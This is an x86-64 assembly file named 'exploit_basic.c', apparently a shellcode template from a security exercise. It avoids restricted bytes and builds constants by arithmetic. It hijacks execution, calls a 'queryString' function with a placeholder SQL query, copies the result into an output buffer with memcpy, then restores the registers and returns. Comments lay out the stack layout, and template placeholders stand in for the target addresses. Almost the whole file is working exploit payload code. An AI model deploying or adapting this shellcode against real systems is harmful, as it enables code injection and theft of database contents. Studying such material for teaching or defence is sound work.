	.file	"exploit_basic.c"
	.text
	.globl	main
	.type	main, @function
# TODO: predecrement RSP (push 0x0?)
# TODO: check if rdi (string begin) is correct
# TODO: fix RSP so that queryString does not destroy stack
# TODO: get writing buffer from rdx? at the beginning

# Explanation:
# -----------
# Beginning:
# 	rdx: pointer to buffer

# Stack:
#	- returnIP = rbx
#	- old r12
#	- old r13
#	- old r15
#	- old rbx <- r15
#	- ... unknown distance, 16 byte aligned
#	- ... unknown distance close to 0 due to not perfect string length calc
#	- query <- %rdi during 1. call

# Running:
#	rbx: returnIP
#	r12: copy of rcx with value 256
#	r13: pointer to buffer (former rdx)
#	r15: rsp befor aligning the stack

main:
.LFB0:
	# copy returnIP to rbx and maintain stack height
	# HINT: do this first, otherwise offset might be different
	pop %rcx
	push %rcx # RIP

	# save RDX to R13 (call target, contains beginning of image)
	push %IND_REG%
	pop %r13

	# save calleesave registers
	push %r12
	push %r13
	push %r15
	push %rbx
	mov %rcx, %rbx # mov rcx (returnIP) to the now saved rbx
	push %rsp # save the current rsp
	pop %r15
	
	# align stack 16 byte
	# push rsp, build mask in rcx, and& with (%rsp), pop again
	push %rsp
	push $0x60
	pop %rcx
	add $-0x60, %rcx
	add $-0x60, %rcx
	andb %cl, (%rsp)
	pop %rsp
## now we are 16-byte aligned

# SQL query
	# mov $256, %rcx # needed for query
	# 2 * 0x7F + 4 overflows the lowest byte without affecting the second one
	push $0x60
	pop %rax
	add $0x7F, %rax
	add $0x7F, %rax
	add $0x7F, %rax
	addb $0x23, %al
	xchg %eax, %ecx
	# zero end of al because we need add stuff
	and $0, %al
	# save 256 for later
	push %rcx
	pop %r12
%QUERY_2B%

%ADDR_2B_Q% # char * queryString(char *)
	call *%rax

	# get Instruction Pointer
	push %r13
	pop %rdi		# dst *
	push %rax
	pop %rsi		# src *
	and $0, %al
	mul %eax	# clear rax?
	mul %eax
	mul %eax
	mul %eax
	# this should be small enough to not overwrite code
	addb $36, %al
#	addb $50, %al
	push %r12
	pop %rcx
	mul %ecx #(256)
	push %rax # pop later in rdx, but pop late to not tamper rdx in the meantime

%ADDR_2B_MEM% # memcpy(dst *, src*, n)
	pop %rdx		# n = 25600
	call *%rax

	# restore rsp
	push %r15
	pop %rsp
	# restore registers
	pop %rbx
	pop %r15
	pop %r13
	pop %r12
	or $1, %al
	
	retq
